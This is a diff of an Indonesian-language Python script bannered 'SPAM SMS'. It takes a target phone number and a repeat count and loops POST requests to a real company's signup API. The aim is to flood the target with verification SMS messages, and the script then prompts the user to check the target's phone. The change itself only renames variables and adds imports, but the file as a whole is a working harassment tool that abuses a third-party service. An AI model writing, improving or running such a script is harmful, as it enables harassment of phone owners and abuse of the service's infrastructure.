@@ -1,7 +1,7 @@
 # mengetik
 
 #import
-import os,sys,time
+import os,sys,time,json
 from time import sleep
 
 # mengetik
@@ -60,7 +60,7 @@ print(f"{O}Login [✓]")
 import time, requests,json,os
 
 os.system("clear")
-
+import requests, json
 print(f"{U}    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
 print(f"{U}    ∎                                    ∎")
 print(f"{U}    ∎         Author  : Rizqi Gans       ∎")
@@ -121,7 +121,7 @@ print(f"{H}∎")
 time.sleep(1.5)
 print(f"{H}∎")
 time.sleep(1.5)
-headers = {
+headers_eci = {
 "Host" : "eci.id",
 "Connection" : "keep-alive",
 "Content-Length" : "27",
@@ -133,12 +133,12 @@ headers = {
 "Accept-Encoding" : "gzip, deflate, br",
 "Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
-data = json.dumps({"identity":"0"+nomer})
+data_eci = json.dumps({"identity":"0"+nomer})
 for k in range(jumlah):
         k += 1
-	pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
+	pos_eci = requests.post("https://eci.id/api/signup",headers=headers_eci,data=data_eci).text
 
-if "success" in pos:
+if "success" in pos_eci:
     print(f"{H}∎")
     time.sleep(1.2)
     print(f"{K}∎∎∎ Cek Hp Target ∎∎∎ ",k)
